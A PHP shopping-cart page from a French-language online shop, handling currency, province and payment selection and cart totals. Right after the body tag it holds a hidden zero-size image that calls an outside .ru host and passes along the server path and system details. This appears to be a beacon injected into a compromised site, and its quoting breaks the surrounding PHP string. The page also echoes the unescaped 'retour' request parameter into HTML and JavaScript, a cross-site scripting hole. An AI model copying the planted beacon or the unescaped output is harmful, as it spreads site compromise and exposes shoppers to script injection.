<?php 
include('lib/config.php');

if( isset( $_POST['devise']) ) 
	$_SESSION['devise'] = $_POST['devise'];

if( isset( $_POST['ModePaye']) ) 
	$_SESSION['paiement']['ModePaye'] = $_POST['ModePaye'];
	
if( isset( $_POST['Province']) ) 
	$_SESSION['province'] = $_POST['Province'];

if( !isset( $_SESSION['province'] ) ) 
	$_SESSION['province'] = 2;

$monPanier = panierInfos($_SESSION['panier'], get_Livreur_id( $_SESSION['province'] ) ); 
$TabPaie =  get_money( "tout" );
$TabProvince = get_Province();
$Symbole	=	get_Symbole($_SESSION['devise']);
$TabModPay = 	get_Modepaye( 0, 0, 0 );

echo
"<html>
	<head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
		<base target='MAIN'>
	</head>
<body><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/> 
	<table width='$Large' bgcolor='#dae5fb' cellpadding='0' cellspacing='0' border='0' align='$Enligne' valign='top' >
		<tr>
			<td> 
"; 
// HTML pour l'entête du panier, genre <table> avec les entêtes de colonnes          
if( $monPanier == false ) {
    // HTML pour un panier vide
	echo "
				&nbsp;
			</td>
		</tr>	
	  	<tr height='80px' > 
	    	<td>
 				<form name='monPanier' action='panier_traite.php?retour=0' method='post' >
				<p align=center><font size +2><b>".$txt['votre_panier_est_vide']."</b></font></p><br>";
	if( $_SESSION['Prio'] < 10 ) {
 		echo 	"<div style='float:left;margin-left:5px'>";
   	echo "<input type='submit' name='btpanier' value='Sauvegarde' style='font-size:10' >";
      echo "&nbsp;&nbsp;<input type='submit' name='btpanier' value='Récupère' style='font-size:10' >";
		echo 	"</div>";
    } // PAS EN PANIER/Modif
    echo "
				</form>
			</td>
		</tr>	
	  	<tr height='100%' > 
	    	<td>";
				include("bas_page.inc");
		echo
			"</td>
	  	</tr>";

}
else {
	/************************************************/
	// Correction du 2007-12-03 Denis Léveillé
	// Un probleme survient lorsque le client emplie son panier qui est sur carte de crédit seul
	// Ensuite regarde un transfert d'argent qui est mandat/chèque seulement et 
	// Retourne dans son panier pour finalement acheter son contenu. le mode de paiement demeure alors
	// celui de la dernière Section visiter, ici le Transfert -> Mandat/Chèque.
	// La correction remet le paiement sur carte de crédit si il ne l'est pas.
	/************************************************/
	switch ( @$_SESSION['paiement']['ModePaye']  ) {
		case 5 : 
		case 6 : 
		case 7 :
					break; 
		default:	//if( $_SESSION['Prio'] > 10 )
						$_SESSION['paiement']['ModePaye'] = 5;
					break;
	} // Si mode de paiement
		
	//***********************************************
	//***** CALCUL DU TOTAL DU PANIER ***************
	//***********************************************
	include('panier_calcul.inc');
	
	switch( $_SESSION['devise'] ) {
		case 'CUC'	:	$image = 'images/cuba.gif';
							$STotal = $_SESSION['Totaux']['SousTotalCUC'];
							$Livraison = $_SESSION['Totaux']['LivraisonCUC'];
							$Douane = $_SESSION['Totaux']['DouaneCUC'];
							$Frais = rounder( $_SESSION['Totaux']['Frais']  / $TxCUC_USD);
							$Total =  $_SESSION['Totaux']['TotalCUC'];
							break;
		case 'USD'	:	$image = 'images/usa.gif';
							$STotal = $_SESSION['Totaux']['SousTotalUSD'];
							$Livraison = $_SESSION['Totaux']['LivraisonUSD'];
							$Douane = $_SESSION['Totaux']['DouaneUSD'];
							$Frais = $_SESSION['Totaux']['Frais'];
							$Total =  $_SESSION['Totaux']['TotalUSD'];
							break;
		case 'EUR'	:	$image = 'images/europe.gif';
							$STotal = $_SESSION['Totaux']['SousTotalEUR'];
							$Livraison = $_SESSION['Totaux']['LivraisonEUR'];
							$Douane = $_SESSION['Totaux']['DouaneEUR'];
							$Frais = rounder( $_SESSION['Totaux']['Frais'] * $TXUSD_EUR );
							$Total =  $_SESSION['Totaux']['TotalEUR'];
							break;
		default		:  $image = 'images/canada.gif';
							$STotal = $_SESSION['Totaux']['SousTotalCAD'];
							$Livraison = $_SESSION['Totaux']['LivraisonCAD'];
							$Douane = $_SESSION['Totaux']['DouaneCAD'];
							$Frais = rounder( $_SESSION['Totaux']['Frais'] * $TXUSD_CAD );
							$Total =  $_SESSION['Totaux']['TotalCAD'];
							break;
	} // switch devise
	$Province	= $_SESSION['province'];
	$_SESSION['Service'] = $_SERVICE_ACHAT;
	
//	$_AVECENTETE = 1;
	$EN_PANIER = 1;
	$_AVECITEM = 1;
	$_AVECTOTAL = 1;
	$_AVECPHOTO = 1;
	$_Retour = 'panier_list';


//	echo "		<br>
	//				<p align=center>
	echo 		"<div style='text-align: center;margin:10px'>
					<font color='#D00E29' size='3' face='verdana'><b>".$txt['txt_intro_panier_show']."</b></font>
				</div>
				<div style='float:left;margin-left:5px'>
					<form name='NewProvince' action='' method='post' >
					<b>".$txt['choix_province']." : </b>
					<select class='s2' name='Province' onchange='document.NewProvince.submit()'>\n";
	foreach($TabProvince as $clé => $valeur ) {									
    	echo "<option value='$clé' ";
    	if(  $Province == $clé ) 
		 	echo " SELECTED";
    	echo " >$valeur\n";
   }
?>	
					</select>
					</form>
				</div>
<?php
/*	if( $_SESSION['Prio'] < 10 ) {
	echo 		"<div style='float:left;margin-left:5px'>
					<form name='NewModePaye' action='' method='post' >
					<b>".$txt['methode_de_paiement']." : </b>
					<select name='ModePaye' size='0' class='s2' onchange='document.NewModePaye.submit();'>";
					foreach($TabModPay as $clé => $valeur ) {									
						echo "<option value='$clé' ";
						if( $_SESSION['paiement']['ModePaye'] == $clé ) 
							echo " SELECTED";
						echo " >$valeur\n";
					}
			echo  "</select>
					</form>
				</div>";
   } // PAS EN PANIER/Modif*/
?>
				<div style='float:right;margin-right:5px'>
					<input type='button' name='Caisse' value='<?=$txt['continuer_a_magasiner']?>' onClick='window.open("speciaux_achat.php?cat=24","MAIN");' />		
				</div><br>
			</td>
		</tr>	
		<tr>
			<td> 
 				<form name='monPanier' action='panier_traite.php?retour=0' method='post' >
<?php if( isset($_GET['retour']) ) 
			echo "<input type='hidden' name='Return' value='".$_GET['retour']."'/>";
?>
						<input type='hidden' name='btpanier' value='<?=$txt['ajouter_votre_panier']?>'/>
					<table width='<?=$Large?>' align='<?=$Enligne?>' cellpadding='0' cellspacing='0' border='1'>
<?php		include('facture.inc'); ?>
					</table>
<?php
/*	if( $_SESSION['Prio'] < 10 ) {
 		echo 	"<div style='float:left;margin-left:5px'>";
   	echo "<input type='submit' name='btpanier' value='Sauvegarde' style='font-size:10' >";
      echo "&nbsp;&nbsp;<input type='submit' name='btpanier' value='Récupère' style='font-size:10' >";
		echo 	"</div>";
    } // PAS EN PANIER/Modif*/
?>
				</form>
			</td>
		</tr>	
		<tr>
			<td>
				<br>
 				<form name='RenewPanier' action='' method='post' >
					<div style='float:left;margin-left:5px'>
					<b><?=$txt['afficher_prix_en_devise']?> : </b> 
					<select class='s1' name='devise' onchange='document.RenewPanier.submit()'>
<?php
				for($i=0;$i<sizeof($TabPaie);$i++) {
					echo "\n<option value='".$TabPaie[$i]."' ";
					if( $_SESSION['devise'] == $TabPaie[$i] ) echo " SELECTED";
					echo " >".$TabPaie[$i];
				} // for $i
?>
					</select></div>
					<div style='float:right;margin-right:5px'>
<?php
		if( isset($_GET['retour']) ) 
			echo "<input type='button' name='Caisse' value='".$txt['retour_etape_finale']."' onClick='window.open(\"".$_GET['retour'].".php\",\"_self\"); return false;' class='form1'>";
		else
			echo "<input type='button' name='Caisse' value='".$txt['passer_a_la_caisse']."' onClick='window.open(\"chk_adresse_facturation.php\",\"MAIN\"); return false;' class='boutrouge' >";
?>
					</div><br>
				</form>
		   </td>
		</tr>
<?		
}

?>
	</table>
<script language='JavaScript1.2'>

	function Rafraichie(){
	//	document.monPanier.submit();
		 		window.location.reload();
	} // Rafraichie
	
	function VoirZoom(No){
			str = 'zoom.php?id=' + No;
			 open( str, '_blank','left=10,top=10,width=460,height=500,status=no,toolbar=no,menubar=no,location=no,resizable=no' );
	} // Rafraichie


</script>
</body>
</html>

